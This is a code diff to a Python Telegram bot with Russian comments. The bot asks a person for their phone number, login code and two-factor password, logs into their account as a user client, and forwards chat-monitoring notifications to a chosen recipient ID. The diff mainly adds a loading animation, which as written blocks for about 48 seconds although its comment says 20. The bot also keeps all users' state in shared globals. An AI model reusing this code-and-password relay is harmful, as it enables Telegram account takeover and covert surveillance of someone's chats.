@@ -27,13 +27,26 @@ waiting_for_code = None
 waiting_for_password = False
 temp_password_phone = None
 message_cache = {}
+animation_task = None
+
+# ========== ФУНКЦИЯ АНИМАЦИИ ==========
+async def show_loading_animation(event, text="⏳ Обработка"):
+    """Показывает анимацию со звёздочкой"""
+    frames = ["⭐", "🌟", "✨", "💫", "⭐", "🌟", "✨", "💫"]
+    msg = await event.reply(f"{frames[0]} {text}...")
+    
+    for i in range(20):  # 20 секунд анимации
+        for frame in frames:
+            await msg.edit(f"{frame} {text}...")
+            await asyncio.sleep(0.3)
+    return msg
 
 # ========== ОБРАБОТЧИКИ ==========
 
 @bot.on(events.NewMessage)
 async def handler(event):
     global waiting_for_target, target_id, waiting_for_phone, waiting_for_code, user_client
-    global waiting_for_password, temp_password_phone
+    global waiting_for_password, temp_password_phone, animation_task
     
     user_id = event.sender_id
     text = event.message.text
@@ -41,6 +54,9 @@ async def handler(event):
     # === 1. ЕСЛИ ЖДЁМ ID ПОЛУЧАТЕЛЯ ===
     if waiting_for_target:
         try:
+            # Показываем анимацию поиска
+            anim = await show_loading_animation(event, "🔍 Поиск пользователя")
+            
             target = await bot.get_entity(text.strip())
             target_id = target.id
             waiting_for_target = False
@@ -49,12 +65,11 @@ async def handler(event):
             if hasattr(target, 'username') and target.username:
                 target_name += f" (@{target.username})"
             
-            await event.reply(
+            await anim.edit(
                 f"✅ **ID получателя сохранён!**\n\n"
                 f"📬 Все уведомления будут отправляться:\n"
                 f"👤 {target_name} (ID: {target_id})\n\n"
-                f"📞 **Теперь нужно войти в твой аккаунт.**\n"
-                f"Отправь мне свой **номер телефона** в формате:\n"
+                f"📞 **Теперь отправь мне свой номер телефона** в формате:\n"
                 f"`+79001234567`"
             )
             waiting_for_phone = True
@@ -69,11 +84,25 @@ async def handler(event):
         waiting_for_phone = False
         waiting_for_code = phone
         
-        await event.reply(
-            f"✅ **Номер получен:** `{phone}`\n\n"
-            f"📨 **Код подтверждения отправлен** в Telegram.\n"
-            f"✍️ Введи его сюда (только цифры):"
-        )
+        # Показываем анимацию отправки кода
+        anim = await show_loading_animation(event, "📨 Отправка кода")
+        
+        try:
+            # Реально создаём клиента и запрашиваем код
+            user_client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
+            await user_client.connect()
+            
+            if not await user_client.is_user_authorized():
+                await user_client.send_code_request(phone)
+                
+            await anim.edit(
+                f"✅ **Код отправлен!**\n\n"
+                f"📨 Код подтверждения отправлен в Telegram.\n"
+                f"✍️ Введи его сюда (только цифры):"
+            )
+        except Exception as e:
+            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз /start")
+            waiting_for_code = None
         return
 
     # === 3. ЕСЛИ ЖДЁМ 2FA ПАРОЛЬ ===
@@ -82,10 +111,12 @@ async def handler(event):
         phone = temp_password_phone
         
         try:
+            anim = await show_loading_animation(event, "🔐 Проверка пароля")
+            
             await user_client.sign_in(password=password)
             
             me = await user_client.get_me()
-            await event.reply(
+            await anim.edit(
                 f"✅ **Успешный вход с 2FA!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
@@ -97,7 +128,7 @@ async def handler(event):
             asyncio.create_task(monitor_user_chats())
             
         except Exception as e:
-            await event.reply(f"❌ Ошибка: {e}\nПопробуй ещё раз:")
+            await anim.edit(f"❌ Ошибка: {e}\nПопробуй ещё раз:")
         return
 
     # === 4. ЕСЛИ ЖДЁМ КОД ===
@@ -106,14 +137,17 @@ async def handler(event):
         code = text.strip()
         
         try:
-            user_client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
-            await user_client.connect()
+            anim = await show_loading_animation(event, "🔑 Проверка кода")
+            
+            if not user_client:
+                user_client = TelegramClient(f'user_{user_id}', API_ID, API_HASH)
+                await user_client.connect()
             
             if not await user_client.is_user_authorized():
                 await user_client.sign_in(phone, code)
             
             me = await user_client.get_me()
-            await event.reply(
+            await anim.edit(
                 f"✅ **Успешный вход!**\n\n"
                 f"👤 Аккаунт: @{me.username}\n"
                 f"📱 Номер: {phone}\n\n"
@@ -127,14 +161,13 @@ async def handler(event):
             waiting_for_password = True
             temp_password_phone = phone
             waiting_for_code = None
-            await event.reply(
+            await anim.edit(
                 "🔐 **Требуется двухфакторный пароль.**\n\n"
                 "Введи свой пароль от Telegram:"
             )
         except Exception as e:
-            await event.reply(f"❌ Ошибка входа: {e}")
+            await anim.edit(f"❌ Ошибка входа: {e}")
             waiting_for_code = None
-            waiting_for_phone = False
         return
 
     # === 5. ОСНОВНЫЕ КОМАНДЫ ===
@@ -163,6 +196,9 @@ async def handler(event):
         waiting_for_phone = False
         waiting_for_code = None
         waiting_for_password = False
+        if user_client:
+            await user_client.disconnect()
+            user_client = None
         await event.reply("🔄 **Настройки сброшены.**\nВведи ID получателя:")
 
 # ========== МОНИТОРИНГ ЧАТОВ ==========
